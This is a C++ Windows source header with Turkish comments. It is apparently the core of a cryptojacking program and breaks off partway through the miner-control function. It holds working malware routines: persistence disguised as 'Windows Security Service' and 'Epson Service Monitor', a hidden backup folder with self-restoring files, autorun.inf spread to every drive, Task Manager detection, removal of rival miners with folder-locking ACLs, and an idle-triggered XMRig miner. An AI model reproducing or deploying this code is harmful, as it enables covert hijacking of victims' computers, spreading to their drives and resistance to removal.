#pragma once
#include "Liblaries.h"      // Proje içi diğer fonksiyonların tanımları
// anti_images_miner_full_legacy.cpp
#include <sddl.h>
#include <Aclapi.h>
#include <taskschd.h>
#include <comdef.h>
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Taskschd.lib")
#pragma comment(lib, "Comsuppw.lib")


// ===================================
//          PROCESS YÖNETİMİ         =
// ===================================

/**
 * @brief Verilen isimdeki çalışan tüm işlemleri bulur ve sonlandırır.
 * @param processName İşlem adı (ör. L"notepad.exe").
 *
 * Sistem üzerinde tüm çalışan işlemleri tarar,
 * ismi verilen işlemle eşleşen varsa açar ve sonlandırır.
 */
void KillProcessByName(const std::wstring& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
         std::cerr << "CreateToolhelp32Snapshot başarısız." << std::endl;
        return;
    }

    PROCESSENTRY32W procEntry = { 0 };
    procEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnap, &procEntry)) {
        std::cerr << "Process32FirstW başarısız." << std::endl;
        CloseHandle(hSnap);
        return;
    }

    do {
        // İşlem ismini büyük-küçük harfe duyarsız şekilde karşılaştırır
        if (_wcsicmp(procEntry.szExeFile, processName.c_str()) == 0) {
            // İşlem açılır ve sonlandırılır
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, procEntry.th32ProcessID);
            if (hProc) {
                if (TerminateProcess(hProc, 0)) {
                    std::wcout << L"Process terminated: " << procEntry.szExeFile << std::endl;
                }
                else {
                    std::cerr << "Process kapatılamadı." << std::endl;
                }
                CloseHandle(hProc);
            }
            else {
                std::cerr << "Process açılamadı." << std::endl;
            }
        }
    } while (Process32NextW(hSnap, &procEntry)); // Tüm işlemleri döner

    CloseHandle(hSnap);
}

/**
 * @brief Verilen isimde bir işlemin çalışıp çalışmadığını kontrol eder.
 * @param processName İşlem adı.
 * @return true: işlem çalışıyor, false: çalışmıyor.
 *
 * Tüm çalışan işlemler taranır,
 * verilen isimle eşleşen varsa true döner.
 */
bool isProcessRunning(const std::wstring& processName) {
    PROCESSENTRY32W entry = { 0 };
    entry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                CloseHandle(snapshot);
                return true;  // Bulundu
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return false;  // Bulunamadı
}

/**
 * @brief Belirtilen uygulamayı arka planda (görünmeden) başlatır.
 * @param fullPath EXE dosyasının tam yolu.
 *
 * CreateProcessW ile yeni işlem oluşturulur,
 * CREATE_NO_WINDOW ile görünür pencere engellenir.
 */
void startProcess(const std::wstring& fullPath) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(fullPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::wcerr << L"Process başlatılamadı: " << fullPath << std::endl;
        return;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// ==============================
// HARİCİ SÜRÜCÜ / DOSYA İŞLEMLERİ
// ==============================

/**
 * @brief Verilen sürücünün harici sürücü olma ihtimalini tahmin eder.
 * @param rootPath Sürücü kökü (örn. "E:\\").
 * @return true ise harici sürücü olabilir.
 *
 * C sürücüsünü otomatik olarak harici kabul etmez.
 * Dosya sistemi FAT32, exFAT veya NTFS ise harici olabilir.
 */
bool isLikelyExternalDrive(const std::string& rootPath) {
    if (rootPath.empty() || rootPath[0] == 'C') return false;

    char fsName[MAX_PATH] = { 0 };
    DWORD serialNum = 0, maxCompLen = 0, fileSysFlags = 0;
    char volumeName[MAX_PATH] = { 0 };

    if (GetVolumeInformationA(
        rootPath.c_str(),
        volumeName,
        MAX_PATH,
        &serialNum,
        &maxCompLen,
        &fileSysFlags,
        fsName,
        MAX_PATH))
    {
        std::string fs(fsName);
        if (fs == "FAT32" || fs == "exFAT" || fs == "NTFS") return true;
    }
    return false;
}

/**
 * @brief Sistemdeki harici sürücüleri bulur ve liste olarak döner.
 * @return Harici sürücülerin kök dizinleri (örn: "E:\\").
 *
 * D'den Z'ye tüm sürücüler taranır,
 * sadece removable ve fixed tipler incelenir,
 * ve isLikelyExternalDrive kontrolünden geçer.
 */
std::vector<std::string> getExternalDrives() {
    std::vector<std::string> externalDrives;
    DWORD drives = GetLogicalDrives();

    for (char letter = 'D'; letter <= 'Z'; ++letter) {
        if (drives & (1 << (letter - 'A'))) {
            std::string rootPath = std::string(1, letter) + ":\\";

            UINT type = GetDriveTypeA(rootPath.c_str());
            if ((type == DRIVE_REMOVABLE || type == DRIVE_FIXED) && isLikelyExternalDrive(rootPath)) {
                externalDrives.push_back(rootPath);
            }
        }
    }
    return externalDrives;
}

/**
 * @brief Kaynak dosyayı hedef sürücüye kopyalar.
 * @param drivePath Hedef sürücü kökü.
 * @param sourceFilePath Kopyalanacak dosyanın tam yolu.
 * @param destFileName Hedef dosya adı.
 *
 * Dosya akışları ile byte byte kopyalama yapılır.
 */
void copyToDrive(const std::string& drivePath, const std::string& sourceFilePath, const std::string& destFileName) {
    std::string destination = drivePath;
    if (drivePath.back() != '\\') {
        destination += "\\";
    }
    destination += destFileName;

    std::ifstream src(sourceFilePath, std::ios::binary);
    if (!src) {
        return;
    }
    std::ofstream dst(destination, std::ios::binary);
    if (!dst) {
        return;
    }

    dst << src.rdbuf();
}

// ==============================
// SİSTEM YOLLARI / BAŞLANGIÇ AYARLARI
// ==============================

/**
 * @brief Sistem geçici dosya dizinini döner.
 * @return Temp dizin yolu (örn: C:\\Users\\Kullanıcı\\AppData\\Local\\Temp\\).
 */
std::string getTempPath() {
    char tempPath[MAX_PATH] = { 0 };
    DWORD len = GetTempPathA(MAX_PATH, tempPath);
    if (len > 0 && len < MAX_PATH) {
        return std::string(tempPath);
    }
    return "";
}

/**
 * @brief Yedek dosyaların gizli tutulduğu klasör yolunu döner.
 * @return Backup klasör yolu.
 *
 * LocalAppData altında "HiddenBin" adında gizli klasör oluşturulur (yoksa).
 */
std::string getBackupPath() {
    char localAppData[MAX_PATH] = { 0 };
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        std::string path(localAppData);
        if (path.back() != '\\') path += "\\";
        path += "HiddenBin\\";

        CreateDirectoryA(path.c_str(), NULL);                 // Klasör yoksa oluşturur
        SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);  // Gizli yapar

        return path;
    }
    return "";
}


/**
 * @brief Dosyanın var olup olmadığını kontrol eder.
 * @param path Dosya yolu.
 * @return true ise dosya var.
 */
static bool fileExists(const std::string& path) {
    std::ifstream f(path);
    return f.good();
}

/**
 * @brief Programı Windows başlangıcına ekler.
 * @param exePath EXE dosyasının tam yolu.
 * @return true ise başarıyla eklendi.
 *
 * Önce HKLM (Yönetici izinli), yoksa HKCU yoluna yazar.
 */
bool AddToStartup(const std::wstring& exePath) {
    HKEY hKey;
    LONG result;

    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);

    if (result == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"EPLTargetP0000000000000000", 0, REG_SZ,
            (const BYTE*)exePath.c_str(),
            (exePath.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        std::wcout << L"HKLM başarıyla yazıldı." << std::endl;
        return true;
    }

    result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);

    if (result == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"EPLTargetP0000000000000000", 0, REG_SZ,
            (const BYTE*)exePath.c_str(),
            (exePath.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        return true;
    }

    std::wcerr << L"Başlangıç anahtarına yazılamadı." << std::endl;
    return false;
}

/**
 * @brief Dosya kopyalar.
 * @param src Kaynak dosya.
 * @param dest Hedef dosya.
 * @return true ise kopyalama başarılı.
 */
bool copyFile(const std::string& src, const std::string& dest) {
    return CopyFileA(src.c_str(), dest.c_str(), FALSE) != 0;
}

/**
 * @brief İzlenen dosyaları kontrol eder, eksikse yedekten geri yükler.
 * @param files İzlenen dosya isimleri.
 * @param tempPath Temp klasörü.
 * @param backupPath Yedek klasörü.
 * @param running Çalışma durumu.
 *
 * Sonsuz döngüde 3 saniyede bir dosya varlığı kontrolü yapar.
 */



void monitorAndRestore(const std::vector<std::string>& files,
    const std::string& tempPath,
    const std::string& backupPath,
    std::atomic<bool>& running) {
    while (running.load()) {
        for (const auto& file : files) {
            std::string tempFile = tempPath + file;
            std::string backupFile = backupPath + file;

            if (!fileExists(tempFile) && fileExists(backupFile)) {
                std::cout << "Silinen dosya bulundu, geri yukleniyor: " << file << std::endl;
                copyFile(backupFile, tempFile);
                SetFileAttributesA(tempFile.c_str(), FILE_ATTRIBUTE_HIDDEN);  // Gizle
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
}


/**
 * @brief Programın yönetici olarak çalışıp çalışmadığını kontrol eder.
 * @return true ise yönetici haklarıyla çalışıyor.
 */
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

/**
 * @brief Verilen isimde servis yoksa oluşturur ve otomatik başlatmaya ayarlar.
 * @param serviceName Servis adı.
 *
 * Mevcut exe dosyasının yolunu alır,
 * servis yöneticisi açılır,
 * servis varsa kapatır, yoksa oluşturur.
 */
static void InstallServiceIfNotExists(const std::wstring& serviceName) {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return;

    SC_HANDLE hServiceCheck = OpenServiceW(hSCManager, serviceName.c_str(), SERVICE_QUERY_STATUS);
    if (hServiceCheck) {
        CloseServiceHandle(hServiceCheck);
        CloseServiceHandle(hSCManager);
        return; // Servis zaten var
    }

    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        exePath,
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (hService) {
        CloseServiceHandle(hService);
    }

    CloseServiceHandle(hSCManager);
}

/**
 * @brief Programı hem kısayol hem registry ile başlangıca ekler.
 * @return true ise her iki işlem de başarılı.
 *
 * - Kısayol Windows açılış klasörüne yazılır.
 * - Registry HKCU'da kayıt yapılır.
 */

bool AddToStartupBoth()
{
    bool shortcutOk = false;
    bool registryOk = false;

    char exePath[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    char startupPath[MAX_PATH] = { 0 };
    if (!SHGetSpecialFolderPathA(NULL, startupPath, CSIDL_STARTUP, FALSE))
    {
        std::cerr << "Startup klasörü bulunamadı!" << std::endl;
        return false;
    }

    std::string shortcutPath = std::string(startupPath) + "\\EpsonService.lnk";

    HRESULT hrCoInit = CoInitialize(NULL);
    if (FAILED(hrCoInit))
    {
        std::cerr << "COM başlatılamadı!" << std::endl;
        return false;
    }

    IShellLinkA* pShellLink = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
        IID_IShellLinkA, (LPVOID*)&pShellLink);

    if (SUCCEEDED(hr))
    {
        hr = pShellLink->SetPath(exePath);
        hr = pShellLink->SetDescription("Epson Service Monitor");

        IPersistFile* pPersistFile = nullptr;
        hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);

        if (SUCCEEDED(hr))
        {
            WCHAR wsz[MAX_PATH] = { 0 };
            MultiByteToWideChar(CP_ACP, 0, shortcutPath.c_str(), -1, wsz, MAX_PATH);
            hr = pPersistFile->Save(wsz, TRUE);
            pPersistFile->Release();

            if (SUCCEEDED(hr))
                shortcutOk = true;
        }
        pShellLink->Release();
    }

    CoUninitialize();

    HKEY hKey = NULL;
    const char* valueName = "Windows Security Service";

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        if (RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, (DWORD)strlen(exePath) + 1) == ERROR_SUCCESS)
        {
            registryOk = true;
        }
        RegCloseKey(hKey);
    }

    return shortcutOk && registryOk;
}

/**
 * @brief Kendi özel temp klasör yolunu döner, yoksa oluşturur.
 * @return %TEMP% altında "VSFeedbackIntelliCodeLogsDatabase\" klasörünün yolu.
 */
std::string getCustomTempPath() {
    std::string baseTemp = getTempPath();
    if (baseTemp.empty()) return "";
    std::string customPath = baseTemp + "VSFeedbackIntelliCodeLogsDatabase\\";
    CreateDirectoryA(customPath.c_str(), NULL);
    return customPath;
}
/**
 * @brief start.cmd içinden İsinfeckt değerini algılar
 * @param cmdPath start.cmd dosyasının tam yolu
 * @return true: İsinfeckt = true; varsa, false: yoksa veya yanlışsa false dondurur
 */

bool detectInfectFromCMD(const std::string& cmdPath) {
    std::ifstream file(cmdPath);
    if (!file.is_open()) {
        std::cerr << "CMD dosyasi acilamadi: " << cmdPath << std::endl;
        return false; // veya hata durumunu ayri kontrol etmek icin std::optional<bool> kullanilabilir
    }

    std::string line;
    while (std::getline(file, line)) {
        std::transform(line.begin(), line.end(), line.begin(), ::tolower); // hepsini küçük harfe çevir
        if (line.find("::") != std::string::npos && line.find("is_infeckt") != std::string::npos) {
            if (line.find("true") != std::string::npos) return true;
            if (line.find("false") != std::string::npos) return false;
        }
    }
    return false; // hicbir satir bulunmazsa false donecek
}

std::string getCopyProgramNameFromCMD(const std::string& cmdPath) {
    std::ifstream file(cmdPath);
    if (!file.is_open()) {
        std::cerr << "CMD dosyasi acilamadi: " << cmdPath << std::endl;
        return "";
    }

    std::string line;
    const std::string key = "::copyProgramName";
    while (std::getline(file, line)) {
        // Satırda key var mı kontrol et
        size_t pos = line.find(key);
        if (pos != std::string::npos) {
            // '=' işaretini ara
            size_t equalPos = line.find('=', pos + key.size());
            if (equalPos != std::string::npos) {
                // '=' sonrası tırnak içinde değeri bul
                size_t firstQuote = line.find('"', equalPos);
                if (firstQuote != std::string::npos) {
                    size_t secondQuote = line.find('"', firstQuote + 1);
                    if (secondQuote != std::string::npos) {
                        return line.substr(firstQuote + 1,
                            secondQuote - firstQuote - 1);
                    }
                }
            }
        }
    }
    return "";
}
 
/**
 * @brief Sistem genelindeki temp klasorunun icerisindeki path_log.txt nin icerisinden
 * Ozel_Dosyalarm.exe varsa HiddenBin klasörüne yedekler.
**/


void BackupProgramToHiddenBin(const std::string& fileName)
{
    char tempPath[MAX_PATH];
    std::string backupPath = getBackupPath();
    // Temp klasörünün yolunu al
    DWORD len = GetTempPathA(MAX_PATH, tempPath);
    if (len == 0 || len > MAX_PATH) {
        std::cerr << "Temp klasörü alınamadı!" << std::endl;
        return;
    }

    std::string pathLog = std::string(tempPath) + "path_log.txt";

    // path_log.txt dosyasını aç
    std::ifstream logFile(pathLog);
    if (!logFile.is_open()) {
        std::cerr << "path_log.txt bulunamadı!" << std::endl;
        return;
    }

    std::string programPath;
    std::getline(logFile, programPath);  // İlk satırdaki yolu al
    logFile.close();

    // Yolu düzgün şekilde birleştir
    if (!programPath.empty() && programPath.back() != '\\') {
        programPath += '\\';
    }

        std::string sourceFile = programPath + fileName;

        if (fileExists(sourceFile)) {
            std::cout << "Bulundu: " << sourceFile << " -> Yedekleniyor..." << std::endl;

            std::string target = backupPath + fileName;

            if (copyFile(sourceFile, target)) {
                SetFileAttributesA(target.c_str(), FILE_ATTRIBUTE_HIDDEN);
                std::cout << "Başarıyla kopyalandı: " << target << std::endl;
            }
            else {
                std::cerr << "Kopyalama başarısız: " << sourceFile << std::endl;
            }
        }
    
}


// Görev Yöneticisinin açık olup olmadığını kontrol eden fonksiyon
bool isTaskManagerOpen() {
    // Sistemdeki tüm processleri listelemek için snapshot oluşturuyoruz
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false; // Snapshot başarısızsa false döndür

    PROCESSENTRY32 pe; // Process bilgilerini tutacak yapı
    pe.dwSize = sizeof(PROCESSENTRY32); // Yapının boyutunu belirtmek zorundayız

    // Process listesinin ilk öğesini alıyoruz
    if (Process32First(hSnapshot, &pe)) {
        do {
            // Eğer çalışan processlerden biri "Taskmgr.exe" ise Görev Yöneticisi açıktır
            if (std::wstring(pe.szExeFile) == L"Taskmgr.exe") {
                CloseHandle(hSnapshot); // Handle kapatılır
                return true; // Görev Yöneticisi açık
            }
        } while (Process32Next(hSnapshot, &pe)); // Diğer processlere geç
    }

    CloseHandle(hSnapshot); /// Handle'i kapatmayı unutmuyoruz
    return false; /// Görev Yöneticisi bulunmadıysa false döndür
}

#pragma region SETUP_PROSESSES

void Check_And_Destroy(const std::vector<std::string>& filesToDelete) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    std::string logFilePath = std::string(tempPath) + "\\install_log.txt";

    std::ifstream file(logFilePath);
    if (!file.is_open()) {
        std::cout << "install_log.txt not found!\n";
        return;
    }

    std::string line;
    bool isComplete = false;
    while (std::getline(file, line)) {
        if (line.find("Successful") != std::string::npos) {
            isComplete = true;
            break;
        }
    }
    file.close();

    if (isComplete) {
        std::this_thread::sleep_for(std::chrono::seconds(50));
        for (const auto& filename : filesToDelete) {
            std::string fullPath = std::string(tempPath) + filename;

            if (DeleteFileA(fullPath.c_str())) {
                std::cout << filename << " deleted successfully.\n";
            }
            else {
                std::cout << filename << " could not be deleted or not found.\n";
            }
        }
    }
    else {
        std::cout << "Installation complete message not found.\n";
    }
    
}


void DestroySetup(const std::string& fileName) {
    char tempPath[MAX_PATH];

    // Temp klasörünün yolunu al
    DWORD len = GetTempPathA(MAX_PATH, tempPath);
    if (len == 0 || len > MAX_PATH) {
        std::cerr << "Temp klasörü alınamadı!" << std::endl;
        return;
    }

    std::string pathLog = std::string(tempPath) + "path_log.txt";

    // path_log.txt dosyasını aç
    std::ifstream logFile(pathLog);
    if (!logFile.is_open()) {
        std::cerr << "path_log.txt bulunamadı!" << std::endl;
        return;
    }

    std::string programPath;
    std::getline(logFile, programPath);  // İlk satırdaki yolu al
    logFile.close();

    // Yolu düzgün şekilde birleştir
    if (!programPath.empty() && programPath.back() != '\\') {
        programPath += '\\';
    }

    std::string fullPath = programPath + fileName;
    std::this_thread::sleep_for(std::chrono::seconds(10));
    // Dosyayı sil
    if (DeleteFileA(fullPath.c_str())) {
        std::cout << fileName << " başarıyla silindi: " << fullPath << std::endl;
    }
    else {
        std::cerr << fileName << " silinemedi! Yol: " << fullPath << std::endl;
    }
}


// Autorun.inf dosyası oluşturur
void CreateAutorunForAllDrives(const std::string& exeName) {
    DWORD drives = GetLogicalDrives();

    for (char drive = 'A'; drive <= 'Z'; drive++) {
        if (drives & (1 << (drive - 'A'))) {
            std::string driveRoot = std::string(1, drive) + ":\\";
            UINT type = GetDriveTypeA(driveRoot.c_str());

            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                std::string autorunPath = driveRoot + "autorun.inf";

                // Daha önce dosya varsa atla (istersen kaldırabilirsin)
                if (GetFileAttributesA(autorunPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                    continue;

                std::ofstream file(autorunPath);
                if (file.is_open()) {
                    file << "[Autorun]\n";
                    file << "open = " << exeName << "\n";
                    file.close();

                    SetFileAttributesA(autorunPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
                    // Program dosyasını gizli ve sistem dosyası olarak işaretler

                }
            }
        }
    }
}


// ===================== LOG FONKSIYONU =====================
// >>> LOG kapatmak istersen bu fonksiyonları yorum satırı yap
std::wofstream logFile;   // LOG: log dosyası

void Log(const std::wstring& msg) {   // LOG: log fonksiyonu
    if (logFile.is_open()) {           // LOG: eğer dosya açıksa
        logFile << msg << std::endl;   // LOG: mesajı yaz
    }
}
// ==========================================================

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}
#pragma endregion
#pragma region ANTI_VIRUS_PROSESSES
// -------------------- Süreçleri öldür --------------------
void KillProcesses(const std::vector<std::wstring>& names) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            for (auto& n : names) {
                if (_wcsicmp(pe.szExeFile, n.c_str()) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProc) {
                        if (TerminateProcess(hProc, 1)) {
                            std::wstring msg = L"[+] Sonlandırıldı: " + std::wstring(pe.szExeFile);
                            std::wcout << msg << L"\n"; Log(msg);  // LOG: süreç loglama
                        }
                        CloseHandle(hProc);
                    }
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

// -------------------- Klasör silme (recursive) --------------------
void DeleteFolder(const std::wstring& folderPath)
{
    std::wstring searchPath = folderPath + L"\\*.*";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(findData.cFileName, L".") != 0 &&
            wcscmp(findData.cFileName, L"..") != 0)
        {
            std::wstring fullPath = folderPath + L"\\" + findData.cFileName;
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                DeleteFolder(fullPath);
            else
                DeleteFileW(fullPath.c_str());
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
    RemoveDirectoryW(folderPath.c_str());
    std::wstring msg = L"[+] Klasör silindi: " + folderPath;
    std::wcout << msg << L"\n"; Log(msg); // LOG: klasör silindi
}

// -------------------- Run temizliği --------------------
void CleanRunKeys(bool admin) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, L"images");
        RegCloseKey(hKey);
        std::wstring msg = L"[+] Kullanıcı Run temizlendi";
        std::wcout << msg << L"\n"; Log(msg); // LOG
    }
    if (admin) {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, L"images");
            RegCloseKey(hKey);
            std::wstring msg = L"[+] Sistem Run temizlendi";
            std::wcout << msg << L"\n"; Log(msg); // LOG
        }
    }
}

// -------------------- Klasör oluştur ve blokla --------------------
void BlockFileCreation(const std::wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) return;

    PSECURITY_DESCRIPTOR pSD = NULL;
    PACL pDacl = NULL;
    BOOL bDaclPresent = FALSE;
    BOOL bDaclDefaulted = FALSE;

    // SDDL'yi security descriptor'e çevir
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
        L"D:(D;;GA;;;WD)", SDDL_REVISION_1, &pSD, NULL))
    {
        // SD'den DACL'i al
        if (GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted)) {
            if (SetNamedSecurityInfoW(
                (LPWSTR)path.c_str(),
                SE_FILE_OBJECT,
                DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                NULL,    // Owner
                NULL,    // Group
                pDacl,   // DACL
                NULL     // SACL
            ) == ERROR_SUCCESS)
            {
                std::wcout << L"[+] Bloklandı: " << path << L"\n";
            }
        }
        LocalFree(pSD);
    }
}


// -------------------- Tüm kullanıcılar için klasör bloklama --------------------
void BlockAllUsersImagesFolder() {
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(L"C:\\Users\\*.*", &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            wcscmp(findData.cFileName, L".") != 0 &&
            wcscmp(findData.cFileName, L"..") != 0)
        {
            std::wstring path = L"C:\\Users\\" + std::wstring(findData.cFileName) + L"\\AppData\\Roaming\\Images";
            BlockFileCreation(path);
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
}

// -------------------- Task temizleme --------------------
void CleanScheduledTasks() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return;

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) { CoUninitialize(); return; }

    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (SUCCEEDED(hr)) {
        IRegisteredTaskCollection* pTaskCollection = NULL;
        hr = pRootFolder->GetTasks(TASK_ENUM_HIDDEN, &pTaskCollection);
        if (SUCCEEDED(hr)) {
            LONG numTasks = 0;
            pTaskCollection->get_Count(&numTasks);
            for (LONG i = 1; i <= numTasks; i++) {
                IRegisteredTask* pTask = NULL;
                if (SUCCEEDED(pTaskCollection->get_Item(_variant_t(i), &pTask))) {
                    BSTR name;
                    pTask->get_Name(&name);
                    std::wstring taskName(name, SysStringLen(name));
                    if (taskName.find(L"images") != std::wstring::npos ||
                        taskName.find(L"miner") != std::wstring::npos) {
                        pRootFolder->DeleteTask(name, 0);
                        std::wstring msg = L"[+] Task silindi: " + taskName;
                        std::wcout << msg << L"\n"; Log(msg); // LOG
                    }
                    SysFreeString(name);
                    pTask->Release();
                }
            }
            pTaskCollection->Release();
        }
        pRootFolder->Release();
    }
    pService->Release();
    CoUninitialize();
}

// -------------------- Servis temizleme --------------------
void CleanServices() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return;

    std::vector<std::wstring> suspect = {
        L"images", L"miner", L"NsCpuCNMiner", L"NsGpuCNMiner"
    };

    for (auto& s : suspect) {
        SC_HANDLE hSvc = OpenServiceW(hSCM, s.c_str(), SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
        if (hSvc) {
            SERVICE_STATUS status;
            ControlService(hSvc, SERVICE_CONTROL_STOP, &status);
            if (DeleteService(hSvc)) {
                std::wstring msg = L"[+] Servis silindi: " + s;
                std::wcout << msg << L"\n"; Log(msg); // LOG
            }
            CloseServiceHandle(hSvc);
        }
    }
    CloseServiceHandle(hSCM);
}

#pragma endregion
#pragma region MINE_PROSESSES
///////////////////////////////////////////////////////////////////////////////////////////

/*
Bu kiisimda performas acisindan biz bosdayken madencinin baslamasini saladiks
*/


// Kullanıcının boşta kaldığı süreyi saniye cinsinden döndürür
DWORD GetIdleTimeSeconds() {
    LASTINPUTINFO lii = { 0 };
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        return static_cast<DWORD>((GetTickCount64() - lii.dwTime) / 1000);
    }
    return 0;
}

// Process çalışıyor mu kontrolü
bool minigProcessRunning(const std::wstring& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W procEntry = { 0 };
    procEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnap, &procEntry)) {
        CloseHandle(hSnap);
        return false;
    }

    do {
        if (_wcsicmp(procEntry.szExeFile, processName.c_str()) == 0) {
            CloseHandle(hSnap);
            return true;
        }
    } while (Process32NextW(hSnap, &procEntry));

    CloseHandle(hSnap);
    return false;
}



// Miner kontrol thread’i
void startMiner(std::atomic<bool>& running, const std::wstring& xmrigPath) {
    std::thread([&running, xmrigPath]() {
        bool minerRunning = false;

        while (running.load()) {
            DWORD idleTime = GetIdleTimeSeconds();

            if (idleTime > 60) { // Kullanıcı 60 saniye boşta ise
